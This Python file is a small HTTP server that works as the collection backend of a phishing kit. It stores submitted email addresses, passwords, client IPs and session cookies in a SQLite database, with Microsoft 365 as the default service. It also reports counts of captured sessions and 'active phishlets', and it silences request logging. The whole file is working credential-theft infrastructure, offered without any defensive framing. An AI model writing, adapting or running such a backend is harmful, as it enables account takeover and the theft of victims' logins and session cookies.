from http.server import HTTPServer, BaseHTTPRequestHandler
import json, sqlite3, datetime

DB = 'phantom.db'

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS sessions (id INTEGER PRIMARY KEY, email TEXT, password TEXT, service TEXT, ip TEXT, cookies TEXT, created_at TEXT)')
    conn.commit()
    conn.close()

init_db()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/health' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok","service":"api"}')
        elif '/api/v1/stats' in self.path:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM sessions')
            count = c.fetchone()[0]
            conn.close()
            self.wfile.write(json.dumps({"total_sessions": count, "active_phishlets": 2}).encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if '/api/v1/credentials' in self.path:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            c.execute('INSERT INTO sessions (email, password, service, ip, cookies, created_at) VALUES (?, ?, ?, ?, ?, ?)',
                     (data.get('email', ''), data.get('password', ''), data.get('service', 'Microsoft 365'), self.client_address[0], json.dumps(data.get('cookies', {})), datetime.datetime.now().isoformat()))
            conn.commit()
            conn.close()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"success": true, "message": "Credentials saved"}')
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
